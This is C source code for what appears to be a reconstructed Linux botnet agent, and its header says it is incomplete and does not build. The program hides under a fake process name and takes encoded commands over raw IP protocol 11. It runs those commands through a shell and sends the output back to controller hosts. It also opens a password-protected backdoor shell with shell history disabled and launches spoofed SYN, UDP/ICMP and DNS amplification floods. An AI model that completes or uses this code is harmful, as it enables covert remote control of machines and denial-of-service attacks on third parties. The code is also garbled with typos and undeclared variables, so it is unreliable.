/* 
 * this is still missing a lot of stuff, like declaring all of the 
 * local variables, including the appropriate header files, cleaning up typos.
 * It's not supposed to build right now.
 */

int
main(int argc, char *argv[])
{
	int random_num, client_ip_index;
	FILE *tmp_file;
	struct iphdr *ip;
	int new_sock, recv_sock;
	int sin_len;
	char arg_buf[256];
	char huge_buffer[12772];
	struct sockaddr_in remote_sin, sin;
	char addresses[40];
	char shell_output[400];
	char buf1[2048], buf2[2048];
	char *msg_data;

	flag = 1;
	ip = (struct iphdr *)buf1;
	msg_data = (buf1 + sizeof(struct iphdr) + 2);
	sin_size = sizeof(struct sockaddr_in);

	if(geteuid()) 
		exit(-1);

	memset(argv[0], 0, strlen(argv[0]));
	strcpy(argv[0], "[mingetty]");

	signal(SIGSEGV, SIG_IGN);
	if(fork())
		exit(0);
	setsid();
	signal(SIGSEGV, SIG_IGN);
	if(fork())
		exit(0);
	chdir("/");

	close(0);
	close(1);
	close(2);

	shell_pid = 0;
	child_pid = 0;
	current_command = 0;

	srandom(time(0));

	recv_sock = socket(PF_INET, SOCK_RAW, 11);
	signal(SIGHUP, SIG_IGN);
	signal(SIGTERM, SIG_IGN);
	signal(SIGCHLD, SIG_IGN);
	signal(SIGCLD, SIG_IGN);

	for(;;) {
		len = recv(recv_sock, buf1, 2048, 0);
		if((ip->protocol == 11) && (buf1[20] == 2) && (len > 200)) {
			decode_packet(len - 22, msg_data, buf2);
			switch(buf2[1]) {
				case 1:
					buf1[0] = 0;
					buf1[0] = uninitialized_int;
					buf1[1] = 1;
					buf1[2] = 7;
					if(shell_pid) {
						recv_buffer[3] = 1;
						recv_buffer[4] = current_command;
					}
					else {
						recv_buffer[3] = 0;
					}
					encode_packet(400, buf1, buf2);
					send_message(addresses, buf2, rand() % 201 + 400);
					break;
				case 2:
					g_send_mode = buf2[2];

					/* 16-19 are raw offsets of destination IP address in IP header */
					g_local_address[0] = buf1[16];
					g_local_address[1] = buf1[17];
					g_local_address[2] = buf1[18];
					g_local_address[3] = buf1[19];

					srandom(time(0));

					client_ip_index = rand() % 10;
					addr_index = 0;
					for(i = 0; i < 10; i++, addr_index += 4) {
						if(i != client_ip_index) {
							if(g_send_mode == 2) {
								addresses[addr_index] = buf2[3 + i * 4];
								addresses[addr_index + 1] = buf2[4 + i * 4];
								addresses[addr_index + 2] = buf2[5 + i * 4];
								addresses[addr_index + 3] = buf2[6 + i * 4];
								
							}
							else {
								random_num = rand();
								if(random_num < 0) rand += 255;
								addresses[addr_index] = random_num;

								random_num = rand();
								if(random_num < 0) random_num += 255;
								addresses[addr_index + 1] = random_num;

								random_num = rand();
								if(random_num < 0) rand += 255;
								addresses[addr_index + 2] = random_num;

								random_num = rand();
								if(random_num < 0) rand += 255;
								addresses[addr_index] = random_num;
							}
						}
					}

					if(send_mode == 0)
						client_ip_index = 0;

					if(send_mode != 2) {
						client_ip_index = client_ip_index * 4;
						p_addresses[client_ip_index] = buf2[3];
						p_addresses[client_ip_index + 1] = buf2[4];
						p_addresses[client_ip_index + 2] = buf2[5];
						p_addresses[client_ip_index + 3] = buf2[6];
					}
					break;
				case 3:	
					if(g_child_pid = fork())
						break;
					setsid();
					signal(SIG_CHLD, SIG_IGN);
					if(!fork()) {
						sleep(10);
						kill(g_child_pid, SIG_KILL);
						exit(0);
					}
					for(i = 0; i < 398; i++)
						buf2[i] = buf2[i + 2];
					sprintf(buf1, "/bin/csh -f -c \"%s\" 1> %s 2>&1", buf2, g_tmp_filename);
					system(buf1);

					if(tmp_file = fopen(g_tmp_filename, "rb")) {
						continuing_data = 0;
						while(n = fread(buf1, 1, 398, tmp_file)) {
							buf1[n] = 0;
							for(i = 0; i < 398; i++) 
								buf2[i + 2] = buf1[i];

							if(continuing_data == 0) {
								buf2[1] = 3;
								continuing_data = 1;
							}
							else {
								buf2[1] = 4;
							}
							encode_data(400, buf2, shell_buffer);
							send_message(addresses, shell_buffer, rand() % 201 + 400);
							usleep(400000);
						}
						fclose(tmp_file);
						unlink(g_tmp_filename);

					}
					_exit(0);
				case 4:
					if(g_shell_pid)
						break;
					current_command = 4;
					if(g_shell_pid = fork())
						break;

					for(i = 0; i < 255; i++)
						arg_buf[i] = buf2[i];

					for(i = 0; i < 255; i++)
						arg_buf[i] = arg_buf[i + 9];

					dns_swarm(buf2[2], buf2[3], buf2[4], buf2[5], 0, buf2[6], buf2[7], buf2[8], command);
					_exit(0);

				case 5:
					if(g_shell_pid)
						break;
					current_command = 5;
					if(g_shell_pid = fork()) 
						break;
					for(i = 0; i < 255; i++)
						arg_buf[i] = buf2[i];
					for(i = 0; i < 255; i++)
						arg_buf[i] = arg_buf[i + 13];
					datagram_flood(buf2[2], buf2[3], buf2[4], buf2[5],
							buf2[6], buf2[7], buf2[8], buf2[9],
							buf2[10], buf2[11], buf2[12], arg_buf);
					_exit(0);
				case 6:
					if(g_shell_pid)
						break;
					current_command = 6;
					signal(SIGCHLD, SIG_IGN);
					if(g_shell_pid = fork())
						break;
					setsid();
					signal(SIGCHLD, SIG_IGN);
					sin.sin_family = PF_INET;
					sin.sin_port = htons(23281);
					sin.sin_addr = INADDR_ANY;
					sockopt_flag = 1; /* ?? */
					sock_fd = socket(PF_INET, SOCK_STREsiAM, 0);
					signal(SIGCHLD, SIG_IGN);
					signal(SIGCLD, SIG_IGN);
					signal(SIGHUP, SIG_IGN);
					signal(SIGTERM, SIG_IGN);
					signal(SIGINT, SIG_IGN);
					setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, sockopt_flag, sizeof(sockopt_flag));
					bind(sock_fd, (struct sockaddr *)&sin, sizeof(sin));
					listen(sock_fd, 3);
					do {
						if((new_sock = accept(sock_fd, (struct_sockaddr *)&remote_sin, &sin_len)) == 0)
							exit(0);
					} while(fork());

					recv(new_sock, huge_buffer, 19, 0);
					for(i = 0; i < 12, i++) {
						if(huge_buffer[i] == '\n' || huge_buffer[i] == '\r')
							huge_buffer[i] = 0;
						else
							huge_buffer[i]++;
					}
					if(strcmp(huge_buffer, "TfOjG")) {
						send(new_sock, g_bytes, 4, 0);
						close(new_sock);
						exit(1);
					}
					dup2(new_sock, 0);
					dup2(new_sock, 1);
					dup2(new_sock, 2);
					setenv("PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin/:.");
					unsetenv("HISTFILE");
					setenv("TERM", "linux");
					execl("/bin/sh", "sh", 0);
					close(new_sock);
					exit(0);
				case 7:
					if(g_child_pid = fork())
						break;
					setsid();
					signal(SIGCHLD, SIG_IGN);
					if(fork()) {
						sleep(1200);
						kill(g_child_pid, SIGKILL);
						exit(0);
					}

					for(i = 0; i < 398; i++)
						buf2[i] = buf2[i + 2];
					sprintf(buf1, "/bin/csh -f -c \"%s\"", buf2);
					system(buf1);
					_exit(0);
				case 8:
					if(g_shell_pid) { 
						kill(g_shell_pid, SIGKILL);
						g_shell_pid = 0;
					}
					break;
				case 9:
					if(g_shell_pid)
						break;
					current_command = 9;
					if(g_shell_pid = fork())
						break;
					for(i = 0; i < 255; i++)
						arg_buf[i] = buf2[i];
					for(i = 0; i < 255; i++)
						arg_buf[i] = arg_buf[i + 10];

					dns_swarm(buf2[2], buf2[3], buf2[4], buf2[5], buf2[6]
							buf2[7], buf2[8], buf2[9], arg_buf);
					_exit(0);
				case 10:
					if(g_shell_pid)
						break;
					current_command = 10;
					if(g_shell_pid = fork())
						break;
					for(i = 0; i < 255; i++)
						arg_buf[i] = buf2[i];
					for(i = 0; i < 255; i++)
						arg_buf[i] = arg_buf[i + 14];

					syn_flood(buf2[2], buf2[3], buf2[4], buf2[5], buf2[6], buf2[7], buf2[8],
							buf2[9], buf2[10], buf2[11], buf2[12], 0, buf2[13], arg_buf);
					_exit(0);
				case 11:
					if(g_shell_pid)
						break;
					current_command = 11;
					if(g_shell_pid = fork())
						break;
					for(i = 0; i < 255; i++)
						arg_buf[i] = buf2[i];
					for(i = 0; i < 255; i++)
						arg_buf[i] = arg_buf[i + 15];

					syn_flood(buf2[2], buf2[3], buf2[4], buf2[5], buf2[6], buf2[7], buf2[8],
							buf2[9], buf2[10], buf2[11], buf2[12], buf2[13], buf2[14], arg_buf);
					_exit(0);
				case 12:
					if(g_shell_pid)
						break;
					current_command = 12;
					if(g_shell_pid = fork())
						break;
					for(i = 0; i < 255; i++)
						arg_buf[i] = buf2[i];
					for(i = 0; i < 255; i++)
						arg_buf[i] = arg_buf[i + 14];

					dns_flood(buf2[2], buf2[3], buf2[4], buf2[5], buf2[6], buf2[7], buf2[8],
							buf2[9], buf2[10], buf2[11], buf2[12], buf2[13], arg_buf);
					_exit(0);

					
					
			}

				       	

	usleep(10000);				
					

					
		
	}
    	
	
	
	


}

void
decode_packet(int size, char *in_buffer, char *out_buffer)
{
	char tmp_buffer[size];
	int index = data_len - 1;
	int value;

	out_buffer[0] = NULL_BYTE;

	while(index >= 0) {
		if(index) {
			value = in_buffer[index] - in_buffer[index - 1] - 23;
		}
		else {
			value = in_buffer[0] - 23;
		}
	
		while(value < 0)
			value += 256;

		for(i = 0; i < size; i++)
			tmp_buffer[i] = out_buffer[i];

		out_buffer[0] = value;

		if(size < 1) {
			for(i = 1; i < size; i++) 
				out_buffer[i] = tmp_buffer[i - 1];
		}


		sprintf(out_buffer, "%c%s", value, tmp_buffer);

		index--;
	}

}

void 
encode_data(int size, char *in_buffer, char *out_buffer)
{
	int i;

	out_buffer[0] = NULL_BYTE;
	sprintf(out_buffer, "%c", in_buffer[0] + 23);

	for(i = 1; i != size; i++)
		out_buffer[i] = in_buffer[i] + out_buffer[i - 1] + 23;
}

int
send_message(char *addresses, char *buffer, int size)
{
	char *p_addresses;	

	if(g_send_mode != 0) {
		p_addresses = addresses;
		do {
			usleep(4000);
			transmit_message(p_addresses, buffer, size);
			p_addresses += 4;
		} while(p_addresses < addresses + 36)

		return 1;
	}

	transmit_message(addresses, buffer, size);
	return 1;
}

int
transmit_message(char *address, char *buffer, int size)
{
	char *send_buf;
	struct iphdr *ip;

	if( (sock_fd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
		return 0;
	send_buf = (char *)malloc(size + 23);
	if(!send_buf)
		return 0;

	ip = (struct iphdr *)send_buf;

	/* ip->saddr */ 
	send_buffer[12] = g_local_address[0];
	send_buffer[13] = g_local_address[1];
	send_buffer[14] = g_local_address[2];
	send_buffer[15] = g_local_address[3];

	/* ip->daddr */
	send_buffer[16] = address[0];
	send_buffer[17] = address[1];
	send_buffer[18] = address[2];
	send_buffer[19] = address[3];

	sprintf(ip_buf, "%d.%d.%d.%d", address[0], address[1], address[2], address[3]);
	sin.sin_addr.s_addr = resolve_ip(ip_buf);
	sin.sin_port = 10;
	sin.sin_family = PF_INET;

	send_buffer[0] = 0x45;
	ip->ttl = 250;
	ip->protocol = 11;
	ip->tot_len = htons(size + 22);
	ip->tos = 0;
	ip->id = htons(rand());
	ip->frag_off = 0;
	ip->check = 0;

	sum = in_checksum(send_buffer, 20);
	ip->checksum = sum;

	send_buffer[20] = 3;
	memcpy(buffer + 22, buffer, size);
        if(sendto(sock_fd, send_buffer, size + 22, 0, (struct sockaddr *)&sin, sizeof(sin)) == -1) {
		free(send_buffer);
		return 0;
	}
	close(sock_fd);
	free(send_buffer);
	return 1;
}


		
	
void
dns_swarm(char ip1, char ip2, char ip3, char ip4, char burst_count, char sport_high, char sport_low, 
		char resolve_flag, char *hostname)
{
	char b1,b2,b3,b4;
	struct hostent *h;
	struct sockaddr_in sin;
	int dns_packet_sizes[9];
	char dns_packet_data[500];
	int ip_address;
	int i;

	b1 = ip1;
	b2 = ip2;
	b3 = ip3;
	b4 = ip4;

	for(i = 0; i < 9; i++) 
		dns_packet_sizes[i] = g_dns_packet_sizes[i];

	some_flag = 1;
	for(i = 0; i < 500; i++) dns_packet_data[i] = g_dns_packet_data[i];

	sin.sin_family = PF_INET;
	sin.sin_port = 0;

	if(burst_count)
		burst_count--;

	if( (sock_fd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		g_shell_pid = 0;
		return;
	}
	memset(packet, 0, 1024);

	for(;;) {
		do {
			resolve_failed = 0;
			if(resolve_flag && count <= 0) {
				h = gethostbyname(hostname);
				if(!h) {
					sleep(600);
					resolve_failed = 1;;
				}
				else {
					bcopy(*h->h_addr, &ip_address, 4);
					ip->saddr = ip_src_address;
				}
			}
		} while(resolve_failed);

		n = 0;
		while(n < 9) {
			if(some_flag) {
				index = random() % 8000;
			}
			else {
				index = 0;
			}
			if(dns_server_ip_array[index]) {
				p_dns_addr = &dns_server_ip_array;
				while(*p_dns_addr) {
		
					sin.sin_addr.s_addr = *p_dns_addr;

					memcpy(dns, dns_packet_data + dns_data_offset, dns_packet_sizes[n]);
					dns[0] = random() % 255; /* dns_id */
					dns[1] = random() % 255; /* dns_id */
					if(sport_high == 0 && sport_low == 0) 
						udp.source = htons( (sport_high << 8) + sport_low) );
					udp.dest = htons(53);

					udp.len = dns_packet_sizes[n];
					udp.check = 0;
					if(resolve_flag == 0) {
						/*ip->saddr;*/
						packet[12] = b1;
						packet[13] = b2;
						packet[14] = b3;
						packet[15] = b4;

					}
					packet[0] = 45;

					ip->ttl = 120 + random() % 130;
					ip->id = random() % 255;	
					ip->protocol = IPPROTO_UDP;
					ip->frag_off = 0;
					ip->tot_len = htons(dns_packet_sizes[n] + 28);
					ip->checksum = 0;
					sum = in_checksum(packet, 20);
					ip->checksum = sum;

					sendto(sock_fd, packet, dns_packet_sizes[n] + 28, 0, (struct sockaddr *)&sin, sizeof(sin));

					if(burst_count == 0) {
						usleep(300);
						count--;
					}
					else {
						if(burst_count == packet_count) {
							usleep(300);
							packet_count = 0;
							count--;
						}
						else {
							packet_count++;
						}
					}
					p_dns_addr++;
				} /* while() */
			} /* if() */
			dns_data_offset += 50;
			n ++;
		} /* while(n < 9) */
	} /* for(;;) */

		

}

void
datagram_flood(char type, char port, char dst1, char dst2, char dst3, char dst4,
		char src1, char src2, char src3, char src4, char resolve_flag, char *hostname)
{

	char dst_b1, dst_b2, dst_b3, dst_b4, src_b1, src_b2, src_b3, src_b4;
	struct sockaddr_in sin;

	sin.sin_family = AF_INET;
	sin.sin_port = htons(random() % 255);
	sprintf(src_ip_buf, "%d.%d.%d.%d", src_b1, src_b2, src_b3, src_b4);
	if(resolve_flag == 0) {
		sprintf(dst_ip_buf, "%d.%d.%d.%d", dst_b1, dst_b2, dst_b3, dst_b4);
		sin.sin_addr.s_addr = inet_addr(dst_ip_buf);
	}

	if( (sock_fd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		g_shell_pid = 0;
		return;
	}
	packet[0] = 45;
	ip->tot_len = htons(10268);
	ip->id = 0x5504;
	ip->ttl = random() % 130 + 120;

	ip->saddr = inet_addr(src_ip_buf);
	if(resolve_flag == 0) {
		ip->daddr = inet_addr(dst_ip_buf);
	}
	ip->frag_off = 0xFE1F;
	ip->check = 0;
	if(type) {
		ip->protocol = IPPROTO_UDP;
		udp->source = htons(random() % 255);
		udp->dest = htons(port);
		udp->len = htons(9);
		sum = in_checksum(udp, 9);
		udp->check = sum;
		packet[28] = 'a';
	}
	else {
		ip->protocol = IPPROTO_ICMP;
		icmp->type = 8;
		icmp->code = 0;
		icmp->checksum = 0;
		sum = in_checksum(icmp, 9);
		icmp->checksum = sum;
	}
	send_len = 29;
	sum = in_checksum(packet, 20);
	ip->check = sum;
	count = 0;
	for(;;) {
		resolve_failed = 0;
		if(resolve_flag) {
			if(count == 0) {
				h = gethostbyname(hostname);
				if(!h) {
					sleep(600);
					resolve_failed = 1;
				}
				else {
					bcopy(h->h_addr, ip_addr_bytes, 4);
					count = 40000;
				}
			}
		}
		if(!resolve_failed) {
			sendto(sock_fd, packet, send_len, 0, (struct sockaddr *)&sin, sizeof(sin));
			sendto(sock_fd, packet, send_len, 0, (struct sockaddr *)&sin, sizeof(sin));
			usleep(20);
		}
		count--;
	}

}

struct pseudo_struct {
	int src_ip;
	int dst_ip;
	char zero;
	char protocol;
	short len;
	char tcp[20];
};
void
syn_flood(char dst1, char dst2, char dst3, char dst4, char dport_high, char dport_low, char saddr_flag,
		char src1, char src2, char src3, char src4, char burst_count, char resolve_flag, char *hostname)
{
	char src_b1, src_b2, src_b3, src_b4, dst_b1, dst_b2, dst_b3, dst_b4;
	struct pseudo_struct pseudo;

	dst_b1 = dst1;
	dst_b2 = dst2;
	dst_b3 = dst3;
	dst_b4 = dst4;

	src_b1 = src1;
	src_b2 = src2; 
	src_b3 = src3;
	src_b4 = src4;
	if(burst_count)
		burst_count--;

	srandom(time(0));
	sin.sin_family = PF_INET;
	sin.sin_port = htons(random() % 255);
	if(!resolve_flag) {
		sprintf(dst_ip_buf, "%d.%d.%d.%d", dst_b1, dst_b2, dst_b3, dst_b4);
		sin.sin_addr.s_addr = inet_addr(dst_ip_buf);
	}
	packet[0] = 0x45;
	ip->tot_len = htons(40);
	ip->tos = 0;
	if( (sock_fd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		g_shell_pid = 0;
		return 0;
	}
	if(saddr_flag) {
		sprintf(src_ip_buf, "%d.%d.%d.%d", src_b1, src_b2, src_b3, src_b4);
	}
	if(!resolve_flag) {
		ip_dst_addr = inet_addr(src_ip_buf);
	}
	ip->frag_off = 0;
	ip->protocol = IPPROTO_TCP;
	tcp->ack = 0;
	tcp->doff = 5;
	tcp->syn = 1;
	tcp->urg_ptr = 0;
	tcp->dest = htons((dport_high << 8) + dport_low)
	pseudo.zero = 0;
	pseudo.protocol = IPPROTO_TCP;
	pseudo.len = htons(20);
	count = 0;

	for(;;) {
		resolve_failed = 0;
		do {
			if(resolve_flag) {
				if(count == 0) {
					h = gethostbyname(hostname);
					if(!h) {
						sleep(600);
						resolve_failed = 1;
					}
					else {
						bcopy(h->h_addr, resolved_ip, 4);
						pseudo.dst_ip = resolved_ip;
						sin.sin_addr.s_addr = resolved_ip;
						count = 40000;
					}
				}
			}
					
		} while(resolve_failed);

		ip->id = htons(rand() % 3089 + 512);
		tcp->window = htons(rand() % 1401 + 200);
		tcp->source = htons(rand() % 40000 + 1);
		tcp->seq = htonl(rand() % 40000000);
		ip->ttl = rand() % 116 + 125;
		if(!saddr_flag) {
			sprintf(src_ip_buf, "%u.%u.%u.%u", random() % 255, random() % 255, random() % 255, random() % 255);
		}
		ip->saddr = pseudo.src_ip = inet_addr(src_ip_buf);
		tcp->check = 0;
		ip->check = 0;
		bcopy(tcp, &pseudo.tcp, 20);
		sum = in_checksum(&pseudo, 20);
		tcp->check = sum;

		sum = in_checksum(packet, 20);
		ip->check = sum;

		sendto(sock_fd, packet, 40, 0, (struct sockaddr *)&sin, sizeof(sin));
		if(burst_count == 0) {
			usleep(300);
			count --;
		}
		else {
			if(burst_count == num_sent) {
				usleep(300);
				num_sent = 0;
				count--;
			}
			else {
				num_sent++;
			}
		}
	} /* for(;;) */
	
}


void
dns_flood(char dst1, char dst2, char dst3, char dst4, char src1, char src2, char src3, dhar src4,
		char burst_count, char sport_high, char sport_low, char resove_flag, char *hostname)
{
	char dst_b1, dst_b2, dst_b3, dst_b4, src_b1, src_b2, src_b3, src_b4;

	dst_b1 = dst1;
	dst_b2 = dst2;
	dst_b3 = dst3;
	dst_b4 = dst4;

	src_b1 = src1;
	src_b2 = src2;
	src_b3 = src3;
	src_b4 = src4;

	for(i = 0; i < 9; i++)
		dns_packet_sizes[i] = g_dns_packet_sizes[i];
	for(i = 0; i < 500; i++) dns_packet_data[i] = g_dns_packet_data[i];

	sin.sin_family = PF_INET;
	sin.sin_port = 0;
	if(!resolve_flag) {
		sprintf(dst_ip_buf, "%d.%d.%d.%d", dst_b1, dst_b2, dst_b3, dst_b4);
	}
	if(burst_count)
		burst_count--;

	if( (sock_fd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		g_shell_pid = 0;
		return;
	}

	memset(packet, 0, 1024);

	for(;;) {
		resolve_failed = 0;
		do {
			if(resolve_flag && count <= 0) {
				h = gethostbyname(hostname);
				if(!h) {
					sleep(600);
					resolve_failed = 1;
				}
				else {
					bcopy(h->h_addr, ip_addr, 4);
					ip->daddr = ip_addr;
					sin.sin_addr = ip_addr;
					count = 40000;
				}
			}
		} while(resolve_failed);
		index = 0;
		dns_data_offset = dns_packet_data;
		while(index < 9) {
			if(!resolve_flag) {
				sin.sin_addr.s_addr = inet_addr(dst_ip_buf);
			}
			memcpy(dns, dns_packet_data + dns_data_offset, dns_packet_sizes[index]);
			dns[0] = random() % 255;
			dns[1] = random() % 255;
			if(sport_high && sport_low) {
				udp->source = htons((sport_high << 8) + sport_low)
			}
			else {
				udp->source = random() % 30000;
			}
			udp->dest = htons(53);
			udp->check = 0;
			if(!(src_b1 || src_b2 || src_b3 || src_b4o)) {
				/* ip->saddr */
				packet[12] = random() % 255;
				packet[13] = random() % 255;
				packet[14] = random() % 255;
				packet[15] = random() % 255;
			}
			else {
				/* ip->saddr */
				packet[12] = src_b1;
			        packet[13] = src_b2;
				packet[14] = src_b3;
				packet[15] = src_b4;	
			}
			if(!resolve_flag) {
				/* ip->daddr */
				packet[16] = dst_b1;
				packet[17] = dst_b2;
				packet[18] = dst_b3;
				packet[19] = dst_b4;
			}
	
			packet[0] = 0x45;
			ip->ttl = random() % 130 + 120;
			ip->id = random() % 255;
			ip->protocol = IPPROTO_UDP;
			ip->frag_offset = 0;
			ip->tot_len = htons(28 + dns_packet_sizes[index]);
			ip->check = 0;
	
			sum = in_checksum(packet, 20);
			ip->check = sum;
	
			sendto(sockfd, packet, 28 + dns_packet_sizes[index], (struct sockaddr *)&sin, sizeof(sin));
			if(burst_count == 0) {
				usleep(300);
				count--;
			}
			else {
				if(burst_count == num_packets) {
					usleep(300);
					num_packets = 0;
				}
				else {
					num_packets++;
				}
			}
			dns_data_offset += 50;
			index++;
		} /* while (index < 9) */
	} /* for(;;);
	
}
